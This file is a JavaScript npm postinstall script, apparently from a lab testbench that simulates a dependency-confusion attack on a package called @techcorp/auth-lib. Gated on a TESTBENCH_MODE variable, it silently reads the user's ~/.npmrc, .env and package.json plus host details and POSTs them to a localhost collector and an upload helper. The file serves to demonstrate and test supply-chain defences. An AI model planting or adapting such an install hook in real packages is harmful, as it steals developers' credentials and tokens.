/**
 * MALICIOUS POSTINSTALL SCRIPT — Scenario 02 (Dependency Confusion)
 *
 * Executes automatically when npm installs this package.
 * The victim never explicitly calls this code — it runs silently during install.
 *
 * In the real attack, a developer runs:
 *   npm install
 * Their package.json lists @techcorp/auth-lib@^1.0.0. Their npm is misconfigured
 * to query the PUBLIC registry for @techcorp/* packages. The attacker published
 * @techcorp/auth-lib@999.999.999 there — npm picks the higher version.
 * This script fires the moment npm extracts the tarball.
 *
 * SAFETY: Only exfiltrates in TESTBENCH_MODE — localhost only.
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const os   = require('os');
  const fs   = require('fs');
  const path = require('path');

  const data = {
    timestamp:      new Date().toISOString(),
    package:        '@techcorp/auth-lib',
    version:        '999.999.999',
    attackType:     'dependency-confusion',
    registrySource: 'public-npm (localhost:4874) — attacker-controlled',
    phase:          'postinstall',
    hostname:       os.hostname(),
    username:       os.userInfo().username,
    platform:       process.platform,
    nodeVersion:    process.version,
    cwd:            process.cwd(),
    env: {
      NODE_ENV:  process.env.NODE_ENV,
      REGISTRY:  process.env.npm_config_registry || 'default',
    },
    files: {},
  };

  // Attempt to read sensitive files (realistic attack behaviour)
  for (const fp of [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), 'package.json'),
  ]) {
    try {
      if (fs.existsSync(fp)) data.files[fp] = fs.readFileSync(fp, 'utf8');
    } catch { /* silently skip */ }
  }

  const payload = JSON.stringify(data);
  const req = http.request({
    hostname: 'localhost',
    port:     3000,
    path:     '/collect',
    method:   'POST',
    headers: {
      'Content-Type':   'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  }, () => {});
  req.on('error', () => {});
  req.write(payload);
  req.end();
  try {
    const { uploadJson } = require('../../../../../detection-tools/floci/floci-exfil');
    uploadJson('02', 'config-exfil', data);
  } catch (_) {}
}
